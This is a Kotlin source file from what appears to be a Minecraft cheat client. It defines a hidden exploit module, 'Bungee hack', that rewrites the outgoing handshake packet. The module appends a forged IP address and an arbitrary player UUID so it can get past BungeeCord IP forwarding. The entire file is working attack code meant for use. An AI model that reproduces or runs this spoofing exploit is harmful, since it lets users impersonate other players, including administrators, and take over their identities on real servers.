package de.florianmichael.tarasande.module.exploit

import de.florianmichael.tarasande.mixin.accessor.IHandshakeC2SPacket
import net.minecraft.client.MinecraftClient
import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket
import su.mandora.tarasande.base.event.Event
import su.mandora.tarasande.base.module.Module
import su.mandora.tarasande.base.module.ModuleCategory
import su.mandora.tarasande.event.EventPacket
import su.mandora.tarasande.value.ValueBoolean
import su.mandora.tarasande.value.ValueText
import java.util.*
import java.util.function.Consumer

class ModuleBungeeHack : Module("Bungee hack", "Bypasses the IP Forwarding System", ModuleCategory.EXPLOIT) {

    init {
        visibleInMenu = false
    }

    private val endIP = ValueText(this, "End IP", "127.0.0.1")
    private val customUUID = ValueBoolean(this, "Custom UUID", false)
    private val uuid = object : ValueText(this, "UUID", UUID.randomUUID().toString()) {

        override fun isEnabled() = customUUID.value
    }

    private val zero = "\u0000"
    private fun stripID(input: String) = input.replace("-", "")

    val eventConsumer = Consumer<Event> { event ->
        when (event) {
            is EventPacket -> {
                if (event.type != EventPacket.Type.SEND) return@Consumer
                if (event.packet !is HandshakeC2SPacket) return@Consumer

                var uuid = MinecraftClient.getInstance().session.uuid
                if (this.customUUID.value)
                    uuid = this.uuid.value

                (event.packet as IHandshakeC2SPacket).florianMichael_extendAddress(this.zero + this.endIP.value + this.zero + this.stripID(uuid))
            }
        }
    }
}